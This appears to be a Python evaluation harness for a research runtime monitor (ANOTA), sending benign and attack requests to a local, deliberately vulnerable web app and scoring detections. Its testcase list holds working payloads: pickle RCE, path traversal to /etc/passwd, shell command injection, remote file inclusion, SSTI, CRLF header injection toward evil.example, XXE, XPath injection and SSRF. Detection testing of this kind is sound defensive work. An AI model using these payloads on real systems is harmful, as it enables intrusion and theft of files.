#!/usr/bin/env python3
"""Baseline-mode harness for the ANOTA-annotated DSVW target.

Runs the annotated app as a long-running subprocess (state shared across
requests) and drives it with a fixed testcase matrix: benign requests must
produce no ANOTA policy hit (TN), attack requests must surface the expected
ANOTA_POLICY:<name> marker in the response body (TP).

Also benchmarks full-process restart cost for comparison with the snapshot
harness (snapshot_dsvw.py).

Usage:  <anota-python> harness_dsvw.py [--reps=15] [--port=65412]
"""
import http.client, json, os, pickle, statistics, subprocess, sys, time, urllib.parse

INTERP = "/home/landasika/icassp/anota/ANOTA/ANOTA-interpreter/python"
APP = "/home/landasika/icassp/exp/dsvw_anota.py"
CWD = "/home/landasika/icassp/targets/dsvw"
HOST = "127.0.0.1"
PORT = 65412
MARK = "ANOTA_POLICY:"

def q(value):
    return urllib.parse.quote(value, safe="")

# --- testcase matrix -------------------------------------------------------
# (name, path-with-query, expect, expected-policy|None, group, note)
BENIGN_PICKLE = q(pickle.dumps({"admin": ("admin", "admin")}))
PICKLE_RCE = q("cos\nsystem\n(S'ping -c 2 127.0.0.1'\ntR.")
HEADER_INJ = q("utf8\r\nX-XSS-Protection: 0\r\n\r\n<!DOCTYPE html><html><body><form action='http://evil.example/log'>")
XXE_LOCAL = q('<!DOCTYPE example [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
XXE_REMOTE = q('<!DOCTYPE example [<!ENTITY xxe SYSTEM "http://127.0.0.1:9/x">]><root>&xxe;</root>')

TESTS = [
    # core 7 benign (parity with the first-run matrix)
    ("benign_object_dict",   "/?object=" + BENIGN_PICKLE, "benign", None, "core", "pickled dict passes pickle_dict_only"),
    ("benign_path_static",   "/?path=static.txt",         "benign", None, "core", "in-root non-source file read"),
    ("benign_domain_lookup", "/?domain=localhost",        "benign", None, "core", "syntax-valid nslookup (resolves locally)"),
    ("benign_include_local", "/?include=plugin.txt",      "benign", None, "core", "local plugin inclusion is allowed"),
    ("benign_tmpl_plain",    "/?tmpl=hello%20world",      "benign", None, "core", "plain-text template has no braces"),
    ("benign_charset_utf8",  "/?charset=utf8",            "benign", None, "core", "well-formed charset parameter"),
    ("benign_comment_insert","/?comment=hello%20world",   "benign", None, "core", "benign DB write (state probe)"),
    # core 7 attacks (parity)
    ("attack_pickle_rce",    "/?object=" + PICKLE_RCE,    "attack", "pickle_dict_only",    "core", "pickle.loads RCE gadget (detector, not preventer)"),
    ("attack_path_traversal","/?path=" + q("../../../../../../etc/passwd"), "attack", "path_web_root",  "core", "escapes web root"),
    ("attack_src_disclosure","/?path=dsvw_anota.py",      "attack", "path_no_source",      "core", "in-root but source file"),
    ("attack_domain_rce",    "/?domain=" + q("www.google.com; ifconfig"), "attack", "domain_syntax", "core", "shell metachar in nslookup arg"),
    ("attack_rfi",           "/?include=https://pastebin.com/raw/6VyyNNhc&cmd=ifconfig", "attack", "include_local_root", "core", "remote file inclusion"),
    ("attack_ssti",          "/?tmpl=" + q("{1.__dict__[system]}"), "attack", "tmpl_plain_text", "core", "format-string escape into os"),
    ("attack_header_injection", "/?charset=" + HEADER_INJ, "attack", "charset_syntax",      "core", "CRLF smuggling via charset param"),
    # extension (enabled by lxml / SSRF guard; not part of the parity matrix)
    ("attack_xxe_local",     "/?xml=" + XXE_LOCAL,        "attack", "xml_no_dtd",          "ext", "local entity resolution (needs lxml)"),
    ("attack_xxe_remote",    "/?xml=" + XXE_REMOTE,       "attack", "xml_no_dtd",          "ext", "remote entity resolution (needs lxml)"),
    ("attack_xpath_injection","/?name=" + q("admin' and substring(password/text(),3,1)='n"), "attack", "xpath_syntax", "ext", "quote breakout in XPath (needs lxml)"),
    ("benign_xml_root",      "/?xml=" + q("<root></root>"), "benign", None,               "ext", "well-formed XML (needs lxml)"),
    ("benign_name_dian",     "/?name=dian",               "benign", None,                  "ext", "syntax-valid XPath lookup"),
    ("attack_ssrf",          "/?path=http://127.0.0.1:631", "attack", "fetch_whitelist",   "ext", "internal host not on fetch whitelist (SSRF)"),
]

def policies_in(body):
    import re
    return sorted(set(re.findall(r"ANOTA_POLICY:(\w+)", body or "")))

def request(path, timeout=60):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        conn.request("GET", path)
        resp = conn.getresponse()
        return resp.status, resp.read().decode(errors="replace")
    finally:
        conn.close()

def start_server(port, log_path):
    log = open(log_path, "ab")
    proc = subprocess.Popen([INTERP, APP, "--port=%d" % port], cwd=CWD, stdout=log, stderr=subprocess.STDOUT)
    return proc

def wait_ready(port, deadline=15.0):
    t0 = time.perf_counter()
    while time.perf_counter() - t0 < deadline:
        try:
            status, _ = request("/", timeout=2)
            if status == 200:
                return time.perf_counter() - t0
        except OSError:
            time.sleep(0.002)
    raise RuntimeError("server did not become ready")

def run_matrix(port, log_path):
    proc = start_server(port, log_path)
    wait_ready(port)
    rows = []
    try:
        for name, target, expect, policy, group, note in TESTS:
            error = None
            try:
                status, body = request(target)
            except Exception as ex:
                status, body, error = None, "", "%s: %s" % (type(ex).__name__, ex)
            hits = policies_in(body)
            if expect == "attack":
                verdict = "TP" if policy in hits else ("FN" if not hits else "TP-MISMATCH")
            else:
                verdict = "TN" if not hits else "FP"
            rows.append(dict(name=name, group=group, expect=expect, policy=policy,
                             hits=hits, status=status, verdict=verdict, error=error, note=note))
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    return rows

def benchmark_restart(port, reps, log_path):
    """spawn -> ready -> first response -> teardown, repeated."""
    samples = []
    for _ in range(reps):
        t0 = time.perf_counter()
        proc = start_server(port, log_path)
        ready = wait_ready(port)
        request("/")  # first full response on a warm listener
        total = time.perf_counter() - t0
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        samples.append(dict(ready=ready * 1e3, total=total * 1e3))
        time.sleep(0.05)
    return samples

def summarize(rows):
    tp = sum(r["verdict"] == "TP" for r in rows)
    fn = sum(r["verdict"] == "FN" for r in rows)
    fp = sum(r["verdict"] == "FP" for r in rows)
    tn = sum(r["verdict"] == "TN" for r in rows)
    mism = [r["name"] for r in rows if r["verdict"] == "TP-MISMATCH"]
    errs = [r["name"] for r in rows if r["error"]]
    return dict(TP=tp, FN=fn, FP=fp, TN=tn, tp_mismatch=mism, errors=errs)

def main():
    global PORT
    port = PORT
    reps = 15
    for arg in sys.argv[1:]:
        if arg.startswith("--port="):
            port = int(arg.split("=", 1)[1])
        elif arg.startswith("--reps="):
            reps = int(arg.split("=", 1)[1])
    log_path = "/tmp/dsvw_baseline.log"
    open(log_path, "wb").close()

    rows = run_matrix(port, log_path)
    print("%-24s %-4s %-7s %-22s %s" % ("testcase", "exp", "verdict", "policy hit(s)", "status"))
    for r in rows:
        print("%-24s %-4s %-7s %-22s %s%s" % (r["name"], r["expect"], r["verdict"],
              ",".join(r["hits"]) or "-", r["status"], ("  ERROR %s" % r["error"]) if r["error"] else ""))
    counts = summarize(rows)
    print("\nbaseline confusion matrix:", json.dumps(counts))

    samples = benchmark_restart(port, reps, log_path)
    ready_ms = [s["ready"] for s in samples]
    total_ms = [s["total"] for s in samples]
    print("restart benchmark (%d reps): ready median %.1f ms (min %.1f, max %.1f); spawn+ready+first-response median %.1f ms"
          % (reps, statistics.median(ready_ms), min(ready_ms), max(ready_ms), statistics.median(total_ms)))

    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")
    os.makedirs(out, exist_ok=True)
    with open(os.path.join(out, "baseline_results.json"), "w") as fh:
        json.dump(dict(mode="baseline", port=port, rows=rows, counts=counts,
                       restart_benchmark=dict(reps=reps, ready_ms_median=statistics.median(ready_ms),
                                              ready_ms_min=min(ready_ms), ready_ms_max=max(ready_ms),
                                              total_ms_median=statistics.median(total_ms),
                                              samples=samples)), fh, indent=1)
    print("results -> exp/results/baseline_results.json")

if __name__ == "__main__":
    main()
